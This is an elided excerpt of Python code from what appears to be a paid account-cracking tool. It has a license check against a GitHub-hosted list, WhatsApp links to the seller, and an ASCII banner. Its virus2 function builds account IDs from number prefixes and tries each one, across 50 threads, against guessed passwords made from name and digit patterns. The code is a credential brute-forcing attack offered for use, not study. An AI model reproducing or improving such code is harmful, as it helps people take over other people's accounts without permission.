...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/NAYEM-BD/Paid/blob/main/Parmesan.txt').text
...
─░█── ░█▄▄▄█ ░█──▀█ ──░█── 　 ░█▄▄▄█ ─░█── ░█─░█ ░█─░█ ░█─░█
  ...
  try:
    httpCaht = requests.get("https://github.com/NAYEM-BD/Paid/blob/main/Parmesan.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/++8801865272669?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/++8801865272669');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virus2():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123','jannat','mimakter','mimmim','arafat','mehedi']
